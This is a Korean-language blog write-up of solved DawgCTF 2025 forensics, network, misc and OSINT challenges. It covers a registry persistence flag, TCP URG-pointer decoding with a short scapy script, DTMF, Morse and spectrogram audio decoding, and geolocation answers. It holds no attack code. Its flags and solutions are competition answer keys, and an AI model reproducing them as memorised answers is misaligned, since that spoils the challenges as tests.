One of our computers on the company network had some malware on it. We think we cleared of the main payload however it came back. Can you check for any signs of persistence? We are able to provide you a copy of the registry, the sooner the better!

*For any registry related challenges, make sure to not overwrite you machines used registry as it is a sensitive system.*  
<br>

---

![Image](https://blog.kakaocdn.net/dn/cqIzYv/btsNtrhn2LN/tQylb9KQMYDGhqGepNBLUk/img.png)

`HKLM_Hives.zip`{: .filepath} 압축 파일이 주어지는데 압축을 해제하면 `HARDWARE`{: .filepath}, `SAM`{: .filepath}, `SOFTWARE`{: .filepath}, `SYSTEM`{: .filepath} 4개의 파일이 들어있다  
<br>

---

![Image](https://blog.kakaocdn.net/dn/nbJkx/btsNrZf3pkB/Up1aO7J9kxvpsheHa6xGy0/img.png)

문제 설명으로부터도 알 수 있듯이 헥스를 까보면 `72 65 67 66` 파일 시그니처로 레지스트리 파일인 것을 알 수 있다  
<br>

---

![Image](https://blog.kakaocdn.net/dn/8zPvk/btsNsbHgtf5/Uk0QSFlLudKqgWKl5cd1Z0/img.png)

Registry Explorer라는 프로그램으로 파싱해서 편하게 분석해볼 수 있는데 레지스트리 파일 4개를 모두 올리고 우선 키워드 검색을 통해서 찾아보자  
<br>

---

![Image](https://blog.kakaocdn.net/dn/b5sZBs/btsNthlKWZ7/3zYe9IM8UdzSLD4RLkLRI1/img.png)

문제 제목과 어울리게 윈도우 스케쥴 레지스트리 위치에 플래그가 숨어 있는 것을 확인할 수 있다  
<br>

---

### Just Packets

Here pcap. Find flag.  
<br>

---

`traffic.pcap`{: .filepath} 파일이 주어진다  
<br>

---

![Image](https://blog.kakaocdn.net/dn/rkM1v/btsNsTFErAK/DkuthYfmsEyTnZzP4K6dMK/img.png)

온라인 분석 사이트에 올려봤는데 FTP 통신 기록에 이런 인코딩 값이 저장되어 있었다  
[A-Packets](https://apackets.com/pcaps/charts)  
<br>

---

```
Once upon a time, in a small, vibrant village nestled between rolling hills and vast forests, a mysterious legend was whispered among the people. The legend spoke of an ancient flag, hidden away for centuries, said to grant immense wisdom and fortune to the one who found it. This flag was not just a piece of fabric; it was a symbol of the village's history and secrets, woven into its very threads.

Year after year, curious adventurers and determined locals set out to find this elusive flag. They scoured ancient texts, deciphered cryptic clues, and embarked on daring expeditions into the unknown parts of the forest. But no matter how hard they searched, the flag remained hidden, as if it was just a figment of their collective imagination.

Among these seekers was a young girl named Elara. Unlike others, Elara was not driven by the promise of wisdom or fortune. She was captivated by the stories and the history that the flag represented. She spent her days poring over old books and listening to the tales of the elders. Her heart was set on finding the flag, not for the glory, but to understand the stories it held within its fibers.

One starlit evening, as Elara sat reading an ancient manuscript, she stumbled upon a line that struck her differently. It read, "The flag you seek is not in this story at all. It'd be a waste of time analysing this text further (seriously)." Puzzled, Elara pondered over these words. She realized that the flag was never meant to be a physical object to be discovered in her story. Instead, maybe it was a metaphor for the village's rich history and the stories that bound its people together.

Elara shared her revelation with the villagers. They gathered around, listening intently as she spoke of the journeys they had undertaken in search of the flag and the bonds they had formed along the way. The stories of their ancestors, their own adventures, and the lessons they learned were the true flag of their village. It was not something to be found but something to be lived and passed down through generations.

From that day on, the villagers no longer sought the flag in the forests or ancient ruins. They found it in their everyday lives, in the stories they shared, and in the legacy they would leave for future generations. The flag was in their heart, in their stories, a text that did not need to be written but to be lived and cherished. And so, the village continued to thrive, rich in tales and wisdom, with the flag forever waving in their collective spirit.
```

이런 글이 하나 나오는데 대충 읽어보면 이 글은 쓸데없으니까 시간 낭비하지 말라는 내용이다

근데 이거 말고는 딱히 단서가 안 보여서 뭔가 싶었는데 힌트를 보니까 URG 포인터를 확인하라고 한다  
<br>

---

```python
from scapy.all import *

packets = rdpcap("./dawgctf-sp25/Just Packets/traffic.pcap")
for pkt in packets:
if pkt.haslayer(TCP) and pkt[TCP].flags & 0x20:
urg_ptr = pkt[TCP].urgptr
print(f"URG Pointer: {urg_ptr}")

# URG Pointer: 25697
# URG Pointer: 30567
# URG Pointer: 17236
# URG Pointer: 18043
# URG Pointer: 30313
# URG Pointer: 27756
# URG Pointer: 24935
# URG Pointer: 25970
# URG Pointer: 29535
# URG Pointer: 25199
# URG Pointer: 28260
# URG Pointer: 29565
# URG Pointer: 10
```

URG Pointer를 뽑아낼 수 있다
TCP 헤더에서 숨어있는 값이라는데 파이썬 코드 구해서 뽑을 수 있다  
<br>

---

```python
urg_pointers = [
25697, 30567, 17236, 18043, 30313, 27756,
24935, 25970, 29535, 25199, 28260, 29565, 10
]

result = b''

for val in urg_pointers:
    high = (val >> 8) & 0xFF
    low = val & 0xFF
    result += bytes([high, low])

print(result.decode())

# dawgCTF{villagers\_bonds}
```

네트워크 통신이면 헥스값을 사용했을테니 출력했던 URG Pointer 값들을 16진수로 바꾸고 2바이트씩 자르면 아스키 코드 형태가 된다

그걸 이어붙이면 플래그가 완성된다  
<br>

---

## **Misc**

### ~~Challenge Files?~~

---

### ~~Discord Challenge~~

---

### ~~Don’t Forget About the Hints!~~

---

### Don’t Touch My Fone

Looks like someone's dialing a phone number, see if you can figure out what it is! The flag format is the decoded phone number wrapped in DawgCTF{} with no formatting, so if the number is 123-456-7890, then the flag is DawgCTF{1234567890}.  
<br>

---

![Image](https://blog.kakaocdn.net/dn/yhBAD/btsNsbgdLHL/sr6fqC78epNEKSeP0mZ6Pk/img.png)

`dtmf.wav`{: .filepath} 파일이 주어지는데 들어보면 전화기 버튼 누르는 삑삑 소리 들린다

그냥 dtmf decoder 사이트 찾아서 돌렸다   
[DTMF Decoder](https://dtmf.netlify.app/)

`DawgCTF{4104553500}`  
<br>

---

### Mystery Signal I

I was listening to my scanner when I heard a strange signal. Can you decode it?  
<br>

---

![Image](https://blog.kakaocdn.net/dn/ptStd/btsNrX3C55X/k68qfct72GJ4u1zNwx99cK/img.png)

`MysterySignal_1.wav`{:. filepath} 파일 주는데 별거 없이 그냥 모스 부호 뚜뚜 소리만 들린다

[Morse - audio decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) 딸깍해줬다  
<br>

---

### Spectral Secrets

I was downloading some music from Limewire and came across a strange file. Can you help me figure out what it is?  
<br>

---

`System_of_a_Down_-Chop_Suey(HQ)_virus_free.wav`{: .filepath} 파일이 주어지는데 이상한 찌끽찌끽 소리 3초 동안 난다  
<br>

---

![Image](https://blog.kakaocdn.net/dn/lZDxN/btsNr4mH1zx/dnAK2kppTaaknnkGEZSOQ1/img.png)

Audicity 프로그램으로 열면 스펙트럼 볼 수 있는데 스펙트럼에 플래그가 적혀있다

처음에 프로그램 깔기 귀찮아서 online 사이트 쓰려 했는데 저 뒤에 b310v3d가 도무지 안 읽혀서 결국 Audicity 깔아서 했다 (별다른 설정 없이 바로 오디오 파일 올리면 된다.. 진작 쓸 걸;;)  
<br>

---

## **OSINT**

### Es ist alless in Butter

Mein Kumpel und ich sind während unseres Besuchs in Deutschland in einem Einkaufszentrum spazieren gegangen. Als wir dort waren, bekamen wir großen Hunger und beschlossen, in einen Supermarkt zu gehen, um frisches Brot und Döner zu kaufen. Als wir in den Laden kamen, waren wir angenehm überrascht, dass es dort eine Brotschneidemaschine gab! Das war sehr praktisch. Wir wollten zurückgehen, aber wir hatten vergessen, wo der Laden war! Dumme Amerikaner, nicht wahr? Wie auch immer, wir hatten Glück, denn mein Kumpel hat zufällig ein Foto in der Gegend gemacht, weil ihm die Architektur gefiel. Können Sie uns helfen, den Supermarkt zu finden, damit wir noch frisches Brot kaufen können, bevor wir zurückfliegen?  
<br>

---

![Image](https://blog.kakaocdn.net/dn/bWymxE/btsNtrn9hkW/a7PHK2RKkK438CTEbkMqK0/img.png)

독일어로 된 설명인데 대충 슈퍼마켓 찾아달라는 내용이다

<https://maps.app.goo.gl/kEnKf9L9FqdTCdrE6>

사진 속 위치는 구글 이미지 검색으로 쉽게 찾을 수 있고 로드뷰로 보면 성 같은 곳 바로 옆에 마켓 하나 있다

마켓 이름 플래그로 입력해주면 된다

`DawgCTF{Kaufland_Berlin-Moabit}`  
<br>

---

### GEOSINT - chall1 - Easy

<https://maps.app.goo.gl/oPefvB3Xh3oDSr3o6>

`DawgCTF{Im-more-of-a-bama-fan}`  
<br>

---

### GEOSINT - chall3 - Easy

<https://maps.app.goo.gl/6L5Kp6EMLJv4zhot5>

`DawgCTF{ifsomeoneorders@HappyCamper_KFC_delivery-illgive10000points}`  
<br>

---

### GEOSINT - chall4 - Easy

<https://maps.app.goo.gl/9nLJwZA5yZNXfHEx9>

`DawgCTF{was_this_actually_easy?}`  
<br>

---

### GEOSINT - chall5 - Easy

<https://maps.app.goo.gl/bxwMSe89Uqe91AQT9>

`DawgCTF{howmanyofyoujustknewitwasbaltimore?}`  
<br>

---

### GEOSINT - chall7 - Medium

<https://maps.app.goo.gl/zHkyWRbvuPz5tUgv8>

`DawgCTF{montereybay_itisnot}`  
<br>

---

### GEOSINT - chall8 - Medium

<https://maps.app.goo.gl/s6KwNbhbr6PkLuYQ9>

`DawgCTF{goodol’missouray}`  
<br>

---

### GEOSINT - chall9 - Medium

<https://maps.app.goo.gl/wdiZd6Y72QaYozAB8>

`DawgCTF{UwUitsaflag}`  
<br>

---

### GEOSINT - chall11 - Hard

<https://maps.app.goo.gl/GmEyc3vTaWzndeyCA>

`DawgCTF{looksatthepenguinz!}`  
<br>

---

### GEOSINT - chall12 - Hard

<https://maps.app.goo.gl/pxw7PbwdmTYtmpDS8>

`DawgCTF{t.r.a.i.n.s}`  
<br>

---

시험 공부하기는 또 귀찮고 그냥 핵테온 연습을 핑계로 진행 중인 CTF 찾아 들어갔다
종료 10시간 전에 시작해서 더 일찍 했으면 더 많이 풀었을 텐데 좀 아쉽다.. 웹이 없어서 그런건지 순위가 생각보다 높게 나왔다

아무튼 오랜만에 좀 난이도 낮은 CTF라 재미있었고 사이트 구성이랑 문제들도 맘에 들었다ㅎㅎ
이번에도 GPT가 하드 캐리했다.. 흠
